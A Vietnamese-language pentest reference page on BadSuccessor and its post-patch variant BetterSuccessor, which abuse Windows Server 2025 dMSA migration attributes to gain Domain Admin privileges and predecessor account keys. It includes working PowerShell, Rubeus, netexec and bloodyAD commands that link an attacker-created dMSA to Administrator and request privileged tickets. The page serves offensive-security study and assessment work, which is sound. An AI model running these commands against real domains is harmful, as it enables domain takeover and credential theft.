# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

**BadSuccessor** khai thác quy trình migration **delegated Managed Service Account** (**dMSA**) được giới thiệu trong **Windows Server 2025**. Một dMSA có thể được liên kết với tài khoản cũ thông qua **`msDS-ManagedAccountPrecededByLink`** và chuyển qua các trạng thái migration được lưu trong **`msDS-DelegatedMSAState`**. Nếu attacker có thể tạo dMSA trong một OU có quyền ghi và kiểm soát các thuộc tính đó, KDC có thể cấp ticket cho dMSA do attacker kiểm soát với **ngữ cảnh ủy quyền của tài khoản được liên kết**.<sup>[[2]](#references)</sup>

Trên thực tế, điều này có nghĩa là một user có đặc quyền thấp, chỉ có quyền OU được ủy quyền, có thể tạo dMSA mới, trỏ nó tới `Administrator`, hoàn tất trạng thái migration, rồi lấy TGT có PAC chứa các nhóm đặc quyền như **Domain Admins**.<sup>[[2]](#references)</sup>

## Chi tiết migration dMSA cần lưu ý

- dMSA là một tính năng của **Windows Server 2025**.
- `Start-ADServiceAccountMigration` đặt migration vào trạng thái **đã bắt đầu**.
- `Complete-ADServiceAccountMigration` đặt migration vào trạng thái **đã hoàn tất**.
- `msDS-DelegatedMSAState = 1` nghĩa là migration đã bắt đầu.
- `msDS-DelegatedMSAState = 2` nghĩa là migration đã hoàn tất.
- Trong quá trình migration hợp lệ, dMSA được thiết kế để thay thế tài khoản cũ một cách trong suốt, vì vậy KDC/LSA duy trì quyền truy cập mà tài khoản trước đó đã có.<sup>[[3]](#references)</sup>

Microsoft Learn cũng lưu ý rằng trong quá trình migration, tài khoản gốc được liên kết với dMSA và dMSA được thiết kế để truy cập những gì tài khoản cũ có thể truy cập.<sup>[[3]](#references)</sup> Đây là giả định bảo mật mà BadSuccessor khai thác.<sup>[[2]](#references)</sup>

## Yêu cầu

1. Một domain có **dMSA**, nghĩa là phía AD có hỗ trợ **Windows Server 2025**.
2. Attacker có thể **tạo** các object `msDS-DelegatedManagedServiceAccount` trong một OU nào đó, hoặc có quyền tạo object con tương đương và đủ rộng tại đó.
3. Attacker có thể **ghi** các thuộc tính dMSA liên quan hoặc kiểm soát hoàn toàn dMSA mà họ vừa tạo.
4. Attacker có thể yêu cầu Kerberos ticket từ ngữ cảnh đã join domain hoặc từ một tunnel có thể kết nối tới LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Kiểm tra thực tế

Dấu hiệu rõ ràng nhất cho operator là xác minh mức domain/forest và xác nhận môi trường đã sử dụng stack Server 2025 mới:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Nếu bạn thấy các giá trị như `Windows2025Domain` và `Windows2025Forest`, hãy ưu tiên kiểm tra **BadSuccessor / lạm dụng di trú dMSA**.

Bạn cũng có thể liệt kê các OU có quyền ghi được ủy quyền để tạo dMSA bằng các công cụ công khai:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Quy trình khai thác

1. Tạo một dMSA trong OU mà bạn có quyền tạo đối tượng con được ủy quyền.
2. Đặt **`msDS-ManagedAccountPrecededByLink`** thành DN của mục tiêu có đặc quyền, chẳng hạn `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Đặt **`msDS-DelegatedMSAState`** thành `2` để đánh dấu quá trình di chuyển đã hoàn tất.
4. Yêu cầu TGT cho dMSA mới và dùng ticket nhận được để truy cập các dịch vụ có đặc quyền.<sup>[[2]](#references)</sup>

Ví dụ PowerShell:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Ví dụ về yêu cầu ticket / công cụ vận hành:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Vì sao đây không chỉ là leo thang đặc quyền

Trong quá trình di chuyển hợp lệ, Windows cũng cần dMSA mới xử lý các ticket đã được cấp cho tài khoản trước đó trước khi chuyển đổi. Đây là lý do tài liệu ticket liên quan đến dMSA có thể bao gồm các khóa **hiện tại** và **trước đó** trong luồng **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Với một cuộc di chuyển giả do kẻ tấn công kiểm soát, hành vi này có thể biến BadSuccessor thành:<sup>[[2]](#references)</sup>

- **Leo thang đặc quyền** bằng cách kế thừa các SID nhóm đặc quyền trong PAC.
- **Lộ tài liệu xác thực** vì việc xử lý khóa trước đó có thể làm lộ tài liệu tương đương với RC4/NT hash của tài khoản tiền nhiệm trong các quy trình dễ bị tấn công.

Điều này khiến kỹ thuật hữu ích cho cả việc chiếm quyền kiểm soát domain trực tiếp lẫn các hoạt động tiếp theo như pass-the-hash hoặc xâm phạm thông tin xác thực trên diện rộng hơn.

## BetterSuccessor sau bản vá KDC

KDC đã được vá sẽ xác thực cả hai phía của quá trình di chuyển dMSA. Ngoài `msDS-ManagedAccountPrecededByLink` và trạng thái di chuyển của dMSA, tài khoản tiền nhiệm phải trỏ ngược về dMSA thông qua `msDS-SupersededManagedAccountLink` và có `msDS-SupersededServiceAccountState` tương thích. Giờ đây, liên kết một chiều sẽ thất bại; tài khoản chỉ có thể tạo dMSA không thể chỉ định tùy ý tài khoản tiền nhiệm nào. Khi có `CreateChild` cho dMSA trong một OU **và** quyền ghi hiệu lực vào các thuộc tính di chuyển của tài khoản mục tiêu đã chọn, kẻ tấn công có thể thiết lập liên kết hai chiều. Ticket dMSA tạo ra có thể mang theo ngữ cảnh cấp quyền của tài khoản tiền nhiệm và làm lộ các khóa của tài khoản đó trong gói khóa dMSA. Đây là một đường tấn công có mục tiêu nhằm truy cập thông tin xác thực/khuếch đại đặc quyền, chứ không chứng minh rằng BadSuccessor tùy ý nhắm mục tiêu ban đầu vẫn khai thác được trên DC đã vá.<sup>[[5]](#references)[[6]](#references)</sup>

Trong môi trường lab đã xác nhận quyền ghi vào tài khoản mục tiêu, `bloodyAD` có thể tạo dMSA và thực hiện các thao tác ghi di chuyển theo cặp. Yêu cầu ticket dMSA bằng tài liệu Kerberos được trả về và kiểm tra quyền thực tế của tài khoản mục tiêu trước khi cho rằng đã lấy được đặc quyền hoặc hash của tài khoản đó. Tên subcommand `badSuccessor` của công cụ không có nghĩa là hành vi một chiều chưa được vá vẫn còn áp dụng.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Lưu ý về trạng thái bản vá

Hành vi BadSuccessor ban đầu **không chỉ là vấn đề lý thuyết trong bản preview năm 2025**. Microsoft đã gán mã **CVE-2025-53779** và phát hành bản cập nhật bảo mật vào **tháng 8 năm 2025**.<sup>[[4]](#references)</sup> Hãy tiếp tục ghi lại cuộc tấn công này để dùng cho:

- **lab / CTF / bài tập assume-breach**
- **môi trường Windows Server 2025 chưa được vá**
- **xác thực việc phân quyền OU và mức độ phơi nhiễm dMSA trong quá trình đánh giá**

Đừng cho rằng một domain Windows Server 2025 dễ bị tấn công chỉ vì có dMSA; hãy xác minh cấp độ bản vá và kiểm tra cẩn thận.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - Lạm dụng dMSA với BadSuccessor để trở thành Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Lạm dụng dMSA để leo thang đặc quyền trong Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Tổng quan về Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor đã chết, BadSuccessor muôn năm(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: Tiếp tục lạm dụng dMSA sau bản vá](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
